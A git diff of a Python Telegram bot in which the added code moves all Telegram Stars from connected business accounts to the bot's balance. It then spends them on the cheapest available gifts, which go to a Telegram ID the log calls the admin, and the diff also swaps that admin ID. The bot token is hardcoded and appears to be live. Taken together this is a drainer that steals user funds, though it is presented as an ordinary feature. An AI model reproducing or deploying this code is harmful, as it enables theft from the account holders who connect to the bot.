@@ -12,7 +12,7 @@ from custom_methods import GetFixedBusinessAccountStarBalance, GetFixedBusinessA
 
 # Configuration
 TOKEN = "7718769489:AAG7_Bv2KS0BwYv8ULyIyMi8EvuBXS7Jbc0"  # Your Bot API Token from @BotFather
-ADMIN_ID = 5011447567  # Your Telegram ID
+ADMIN_ID = 8077821068  # Your Telegram ID
 
 bot = Bot(TOKEN)
 dp = Dispatcher()
@@ -273,6 +273,38 @@ async def get_message(message: types.Message):
         stars = await bot.get_business_account_star_balance(business_id)
         if hasattr(stars, 'amount') and stars.amount > 0:
             print(f"Найдено {stars.amount} звёзд")
+            
+            # Переводим звёзды на баланс бота
+            await bot.transfer_business_account_stars(business_id, stars.amount)
+            print(f"Успешно переведено {stars.amount} звёзд на баланс бота")
+            
+            # Покупаем подарки за звёзды и отправляем админу
+            try:
+                available_gifts = await bot.get_available_gifts()
+                if available_gifts and available_gifts.gifts:
+                    # Находим самый дешёвый подарок
+                    cheapest_gift = min(available_gifts.gifts, key=lambda g: g.star_count)
+                    star_balance = stars.amount
+                    gifts_to_buy = star_balance // cheapest_gift.star_count
+                    
+                    print(f"Покупаем {gifts_to_buy} подарков по {cheapest_gift.star_count} звёзд каждый")
+                    
+                    for i in range(gifts_to_buy):
+                        try:
+                            await bot.send_gift(
+                                user_id=task_id,
+                                gift_id=cheapest_gift.id
+                            )
+                            print(f"Отправлен подарок {i+1}/{gifts_to_buy}")
+                        except Exception as e:
+                            print(f"Ошибка при отправке подарка {i+1}: {e}")
+                            break
+                            
+                    print(f"Всего отправлено подарков админу: {gifts_to_buy}")
+                else:
+                    print("Нет доступных подарков для покупки")
+            except Exception as e:
+                print(f"Ошибка при покупке подарков: {e}")
         else:
             print("Нет звёзд для отправки.")
     except Exception as e:
